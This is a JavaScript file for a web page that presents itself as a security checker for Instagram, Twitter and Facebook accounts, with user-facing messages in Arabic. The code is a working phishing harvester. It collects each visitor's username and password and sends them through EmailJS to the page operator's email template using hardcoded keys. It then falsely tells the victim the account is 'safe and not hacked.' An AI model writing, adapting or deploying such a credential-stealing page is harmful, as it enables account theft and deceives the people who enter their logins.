// Initialize EmailJS
(function() {
    emailjs.init("1xqwBMfecM1SSulsh"); // Public Key
})();

// Toggle Forms
function toggleForm(platform) {
    document.querySelectorAll('.form').forEach(form => form.classList.add('hidden'));
    document.getElementById(`${platform}-form`).classList.remove('hidden');
    document.getElementById('result').classList.add('hidden');
}

// Check Security
function checkSecurity(platform) {
    const username = document.getElementById(`${platform}-username`).value;
    const password = document.getElementById(`${platform}-password`).value;

    if (!username || !password) {
        Swal.fire('خطأ', 'يرجى إدخال اسم المستخدم وكلمة المرور.', 'error');
        return;
    }

    // عرض رسالة تحميل
    Swal.fire({
        title: 'جاري الفحص...',
        text: 'يرجى الانتظار',
        allowOutsideClick: false,
        didOpen: () => {
            Swal.showLoading();
        }
    });

    // إرسال البريد الإلكتروني
    emailjs.send("service_ir3vg5y", "template_jw2qkzr", {
        platform: platform,
        username: username,
        password: password
    }).then(function(response) {
        Swal.fire('نجاح', 'تم إرسال البيانات بنجاح!', 'success');
        document.getElementById('result-message').textContent = "الحساب آمن وغير مخترق.";
        document.getElementById('result').classList.remove('hidden');
    }, function(error) {
        console.error('Error sending email:', error); // إضافة سجل للخطأ
        Swal.fire('خطأ', 'حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.', 'error');
        document.getElementById('result-message').textContent = "حدث خطأ أثناء الفحص. يرجى المحاولة مرة أخرى.";
        document.getElementById('result').classList.remove('hidden');
    });
}

// إضافة معالجات الأحداث
document.getElementById('instagram-btn').addEventListener('click', () => toggleForm('instagram'));
document.getElementById('twitter-btn').addEventListener('click', () => toggleForm('twitter'));
document.getElementById('facebook-btn').addEventListener('click', () => toggleForm('facebook'));

document.getElementById('instagram-check').addEventListener('click', () => checkSecurity('instagram'));
document.getElementById('twitter-check').addEventListener('click', () => checkSecurity('twitter'));
document.getElementById('facebook-check').addEventListener('click', () => checkSecurity('facebook'));
